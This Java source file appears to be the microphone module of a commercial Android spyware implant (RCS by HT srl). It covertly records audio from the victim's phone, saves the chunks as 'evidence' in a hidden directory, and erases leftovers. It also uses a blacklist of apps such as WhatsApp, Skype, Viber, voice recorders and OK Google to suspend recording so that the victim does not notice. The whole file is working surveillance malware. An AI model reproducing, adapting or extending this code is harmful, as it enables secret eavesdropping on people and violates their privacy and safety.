/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.content.Context;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;
import android.os.PowerManager;

import com.android.dvci.ProcessInfo;
import com.android.dvci.Standby;
import com.android.dvci.StateRun;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.event.LowEvent.AudioEvent;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.interfaces.IProcessObserver;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.listener.ListenerStandby;
import com.android.dvci.listener.LowEventAudioManager;
import com.android.dvci.manager.ManagerModule;
import com.android.dvci.module.message.LowEventAudio;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.util.HashSet;
import java.util.Set;

/**
 * The Class MicAgent. 8000KHz, 16bit
 *
 * @author zeno
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 */
public abstract class ModuleMic extends BaseModule implements  OnErrorListener, OnInfoListener, IProcessObserver, Observer<LowEventAudio> {

	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
	private static final String STOP_REASON_PROCESS = "BLACKLISTED_PROCESS"; //$NON-NLS-1$
	protected static final long MIC_PERIOD = 5000;
	// #!AMR[space]
	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
	protected static final int SUSPEND_CALL = 0;
	protected static StandByObserver standbyObserver;
	protected boolean recorder_started=false;
	protected int numFailures;
	protected long fId;
	protected static final String MIC_SUFFIX = M.e(".a"); //$NON-NLS-1$
	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};

	/**
	 * The recorder.
	 */
	MediaRecorder recorder;

	private Observer<ProcessInfo> processObserver;

	public Set<String> blacklist = new HashSet<String>();
	private PowerManager pm = null;
	private int amp_zero_count = 0;
	private boolean uselowLevelNotification = false;

	public ModuleMic() {
		super();
		resetBlacklist();
		cleanLeftoverEvidence();
		pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);

	}
	public boolean isRecording() {
		return recorder_started;
	}
	public synchronized void resetBlacklist() {
		blacklist.clear();
		addBlacklist(M.e("shazam"));
		addBlacklist(M.e("com.vlingo"));
		addBlacklist(M.e("soundrecorder"));
		addBlacklist(M.e("voicerecorder"));
		addBlacklist(M.e("voicesearch"));
		addBlacklist(M.e("com.andrwq.recorder"));
		addBlacklist(M.e("com.skype.raider"));
		addBlacklist(M.e("com.viber.voip"));
		addBlacklist(M.e("com.whatsapp"));
		addBlacklist(M.e("com.facebook.katana"));
		addBlacklist(M.e("com.facebook.orca"));
		addBlacklist(M.e("com.tencent.mm"));
		addBlacklist(M.e("jp.naver.line.android"));
		addBlacklist(M.e("com.google.android.talk"));
		if (Utils.isSpeechRecognitionActivityPresent()) {
			addBlacklist(Status.OK_GOOGLE_ACTIVITY);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(resetBlacklist)voice Recognition not present");//$NON-NLS-1$
			}
		}
	}

	public synchronized void addBlacklist(String black) {
		blacklist.add(black);
	}
	public synchronized void delBlacklist(String black) {
		blacklist.remove(black);
	}
	public synchronized boolean inInBlacklist(String process) {
		return blacklist.contains(process);
	}

	public static ModuleMic self() {
		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
	}

	/**
	 *
	 * @return lowLevel notification settings
	 */
	public boolean isUselowLevelNotification() {
		return uselowLevelNotification;
	}

	/**
	 * Settings are configured only if ModuleMic isn't already started
	 * @param uselowLevelNotification sets lowLevel notification settings
	 *
	 */

	public  void setUselowLevelNotification(boolean uselowLevelNotification) {
		if(status != StateRun.STARTED) {
			this.uselowLevelNotification = uselowLevelNotification;
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setUselowLevelNotification): unable to change lowLevel setting, Module already started");
			}
		}
	}

	/*
		 * (non-Javadoc)
		 *
		 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
		 */
	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(MIC_PERIOD);
		setDelay(MIC_PERIOD);
		return true;
	}

	void cleanLeftoverEvidence() {
		File fList = new File(Path.hidden() + M.e("/"));
		File[] files = fList.listFiles(new FilenameFilter() {
			public boolean accept(File dir, String filename) {
				return filename.endsWith(MIC_SUFFIX);
			}
		});
		for (File f : files) {
			if (f.exists()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (cleanLeftoverEvidence) deleting : " + f.getName());
				}
				if (!f.delete()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (cleanLeftoverEvidence) failure deleting : " + f.getName());
					}
				}
			}
		}
	}
	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
	 */
	@Override
	public void actualStart() {
		try {

			if (Cfg.DEBUG) {
				Check.requires(status == StateRun.STARTING, "inconsistent status"); //$NON-NLS-1$
			}
			cleanLeftoverEvidence();
			if (standbyObserver == null) {
				standbyObserver = new StandByObserver(this);
			}

			addPhoneListener();
			if (Cfg.DEBUG) {
				Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
			}
			ListenerStandby.self().attach(standbyObserver);
			if( isUselowLevelNotification() ) {
				LowEventAudioManager.self().attach(this);
			}
			if (canRecordMic()) {
				startRecord();

				if (Cfg.DEBUG) {
					Check.log(TAG + "started");//$NON-NLS-1$
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "cannot start");//$NON-NLS-1$
				}
			}
		} catch (final IllegalStateException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (begin) Error: " + e.toString());//$NON-NLS-1$
			}
		} catch (IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		}
	}

	private void startRecord() throws IOException {
		// todo: sync
		specificStart();
	}

	abstract void specificStart() throws IOException;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
	 */
	@Override
	public void actualStop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (end)");//$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(status == StateRun.STOPPING, "state not STOPPING"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.asserts(standbyObserver != null, " (actualStop) Assert failed, null standbyObserver");
		}
		removePhoneListener();
		if( isUselowLevelNotification() ) {
			LowEventAudioManager.self().detach(this);
		}
		ListenerStandby.self().detach(standbyObserver);
		standbyObserver=null;
		specificStop();
		cleanLeftoverEvidence();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (ended)");//$NON-NLS-1$
		}
	}

	abstract void specificStop();

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 * actualGo runs only if not suspended
	 */
	@Override
	public void actualGo() {
		if (Cfg.DEBUG) {
			Check.requires(status == StateRun.STARTED, "inconsistent status"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualGo), recorder=" + recorder + "is recording=" + isRecording());
		}
		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualGo), recorder not ready");
			}
			if (canRecordMic()) {
				try {
					startRecord();
				} catch (IOException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (actualGo), cannot start record: " + e);
					}
				}
			}
			return;
		}

		/* changed straight amp check to at least 2 time of zeroAmp
		 * to avoid that just having one time amp=0 will restart the mic track
		 */
		if(recorder.getMaxAmplitude()==0){
			amp_zero_count++;
		}else{
			amp_zero_count=0;
		}
		if (amp_zero_count <= 1 || !isRecording()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualGo):amplitude not zero isRecording=" + isRecording());//$NON-NLS-1$
			}
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualGo) start again recorder amplitude was null");//$NON-NLS-1$
			}
			specificStop();
			amp_zero_count = 0;
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopAndStart): stop");
			}
		}

		specificGo(numFailures);
		if (numFailures > 10) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "numFailures: " + numFailures);//$NON-NLS-1$
			}
			stopThread();
		}
		if (Status.self().crisisMic()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "crisis!");//$NON-NLS-1$
			}
			suspend();
		}

	}

	@Override
	public void notifyStop(String b, boolean add) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notifyStop): " + b + "add= "+add);
		}
		if(add){
			suspend();
		}else if(!haveStops()){
			resume();
		}
	}

	abstract void specificGo(int numFailures);

	private void addPhoneListener() {


		if (processObserver == null) {
			processObserver = new ProcessObserver(this);
		}
		ListenerProcess.self().attach(processObserver);
	}

	private void removePhoneListener() {
		ListenerProcess.self().detach(processObserver);
	}

	@Override
	public void notifyProcess(ProcessInfo b) {
		AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
		boolean headset = audioManager.isWiredHeadsetOn();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notifyProcess) headset: " + headset);
		}
		isForegroundBlacklist();
	}

	int index = 0;
	byte[] unfinished = null;

	protected synchronized void saveRecorderEvidence() {

		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveRecorderEvidence) Error: recorder is null");

			}
			numFailures += 1;
			return;
		}
		byte[] chunk = getAvailable();
		byte[] data = null;
		if (chunk != null && chunk.length > 0) {
			// data contiene il chunk senza l'header
			if (ByteArray.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence): remove header");
				}
				int offset = AMR_HEADER.length;
				data = ByteArray.copy(chunk, offset, chunk.length - offset);
				if (Cfg.MICFILE) {
					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
					index++;
					file.write(chunk);
				}
			} else if (unfinished != null && unfinished.length > 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence): copy bias=" + ByteArray.byteArrayToHex(unfinished));
				}
				data = ByteArray.concat(unfinished, unfinished.length, chunk, chunk.length);
				if (Cfg.MICFILE) {
					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
					index++;
					file.write(data);
				}
			} else {
				// if (Cfg.DEBUG) {
				// Check.log(TAG +
				// " (saveRecorderEvidence): plain chunk, no bias");
				// }
				data = chunk;
				if (Cfg.MICFILE) {
					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
					index++;
					file.write(data);
				}
			}
			// capire quale parte del chunk e' spezzata.
			/* Find the packet size */
			int pos = 0;
			int chunklen = 0;
			do {
				if (pos >= data.length) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (saveRecorderEvidence) Error: strange pos");
					}
					numFailures += 1;
					return;
				}
				chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];
				if (chunklen == 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
					}
				}
				pos += chunklen + 1;
				if (false && Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence): pos = " + pos + " chunklen = " + chunklen);
				}
			} while (pos < data.length);

			int unfinishedLen = 0;
			int unfinishedPos = 0;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveRecorderEvidence), data.length+1: " + (data.length + 1) + " pos: " + pos);
			}
			if (pos > data.length + 1) {

				// portion of microchunk to be saved for the next time

				unfinishedLen = (chunklen - (pos - data.length) + 1) % chunklen;
				unfinishedPos = pos - chunklen - 1;

				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence): unfinishedLen = " + unfinishedLen + " unfPos: "
							+ unfinishedPos + " chunklen: " + chunklen);
				}

				unfinished = ByteArray.copy(data, unfinishedPos, data.length - unfinishedPos);
				if (unfinished.length > 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (saveRecorderEvidence): removing unfinished from data");
					}
					data = ByteArray.copy(data, 0, unfinishedPos);
				}
			}

			if (data.length > 0) {
				EvidenceBuilder.atomic(EvidenceType.MIC, getAdditionalData(), data);
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " zero chunk ");//$NON-NLS-1$
			}
			numFailures += 1;
		}
	}

	abstract byte[] getAvailable();
	// http://sipdroid.googlecode.com/svn/trunk/src/org/sipdroid/sipua/ui/VideoCamera.java

	/**
	 * Stop recorder.
	 */
	abstract void stopRecorder();

	private byte[] getAdditionalData() {
		final int LOG_MIC_VERSION = 2008121901;
		final int LOG_AUDIO_CODEC_AMR = 0x01;
		final int sampleRate = 8000;
		final int tlen = 16;
		final byte[] additionalData = new byte[tlen];
		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);
		databuffer.writeInt(LOG_MIC_VERSION);
		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
		databuffer.writeLong(fId);

		if (Cfg.DEBUG) {
			Check.ensures(additionalData.length == tlen, "Wrong additional data name"); //$NON-NLS-1$
		}
		return additionalData;
	}


	public int notification(Standby b) {
		if (b.isScreenOff()) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification) standby, resume mic, remove OK_GOOGLE stop if present");
			}
			if(inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
				removeStop(Status.STOP_REASON_OK_GOOGLE);
			}
			if(canRecordMic()) {
				resume();
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification) unlocking, resume mic");
			}
			isForegroundBlacklist();
		}
		return 0;
	}

	private boolean isForegroundBlacklist() {

		if(LowEventAudioManager.self().isInstrumented()){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (isForegroundBlacklist) instrument running skippig list check ");
			}
			return false;
		}
		String foreground = Status.self().getForeground();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (isForegroundBlacklist) checking \""+foreground+"\'");
		}
		for (String bl : blacklist) {
			if (foreground.contains(bl)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (isForegroundBlacklist) found blacklist");
				}
				if (foreground.contains(Status.OK_GOOGLE_ACTIVITY)) {
					if (pm != null && !pm.isScreenOn()) {
						Check.log(TAG + " (isForegroundBlacklist) skip adding OK_GOOGLE when screen is off");
						return false;
					}
					if (!inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
						addStop(Status.STOP_REASON_OK_GOOGLE);
					}

				} else {
					if (!inStoplist(STOP_REASON_PROCESS)) {
						addStop(STOP_REASON_PROCESS);
					}
				}
				return true;
			}
		}
		if(inStoplist(STOP_REASON_PROCESS)) {
			removeStop(STOP_REASON_PROCESS);
		}
		if (inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
			removeStop(Status.STOP_REASON_OK_GOOGLE);
		}
		return false;
	}



	public boolean canRecordMic() {
		if (!Status.crisisMic() && !haveStops()) {
			if (isForegroundBlacklist() ) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (canRecordMic) can't resume because of blacklist");
				}
				return false;
			}
/* try to run mic and call at the same time
			if (ModuleCall.self() != null && (ModuleCall.self().isBooted()==false || ModuleCall.self().canRecord()) ) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (canRecordMic) can't switch on mic because call is available");
				}
				return false;
			}
			*/
			if (Cfg.DEBUG) {
				Check.log(TAG + " (canRecordMic)yes we can rec");
			}
			return true;
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (canRecordMic) crisis or stoplist, cant rec");
		}
		return false;
	}

	abstract void specificSuspend();
	abstract void specificResume();
	@Override
	public synchronized void resume() {
		/* just restart the thread, if mic can record the actualGo will restart it */
		if (isSuspended()) {
			super.resume();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (resumed)");//$NON-NLS-1$
			}
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (resume): no need to resume : isSuspend=" + isSuspended());
			}
		}
	}
	@Override
	public synchronized void suspend() {

		if (!isSuspended()) {
			amp_zero_count=0;
			specificSuspend();
			if (Status.self().semaphoreMediaserver.tryAcquire()) {
				try {
					super.suspend();
					if (Cfg.DEBUG) {
						Check.log(TAG + " (suspended)");//$NON-NLS-1$
					}
				} finally {
					Status.self().semaphoreMediaserver.release();
				}
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " (suspend): not suspending really because of mediaserver stopped by RCS");//$NON-NLS-1$
				}
			}
		}
	}

	public void stop() {
		suspend();
	}

	@Override
	public String getTag() {
		return TAG;
	}

	@Override
	public int notification(final LowEventAudio b) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification)");//$NON-NLS-1$
		}
		if(b.audio_data !=null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification) sub_type="+b.audio_data.sub_type);//$NON-NLS-1$
			}
			if (b.audio_data.sub_type == AudioEvent.AUDIO_REC_INIT || b.audio_data.sub_type == AudioEvent.AUDIO_REC_START) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): STOP RECORD");//$NON-NLS-1$
				}

			/*
				if (b.power_data.className.contains(Status.OK_GOOGLE_ACTIVITY)) {
					if (pm != null && !pm.isScreenOn()) {
						Check.log(TAG + " (isForegroundBlacklist) skip adding OK_GOOGLE when screen is off");
						return false;
					}
					if (!inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
						addStop(Status.STOP_REASON_OK_GOOGLE);
					}
				}else{
				*/
				if (!inStoplist(STOP_REASON_PROCESS)) {
					addStop(STOP_REASON_PROCESS);
				}
				//}

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): START RECORD");//$NON-NLS-1$
				}
				if (inStoplist(STOP_REASON_PROCESS)) {
					removeStop(STOP_REASON_PROCESS);
				}
				if (inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
					removeStop(Status.STOP_REASON_OK_GOOGLE);
				}
			}
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification):b.power_data null");//$NON-NLS-1$
			}
		}
		return 0;
	}
}
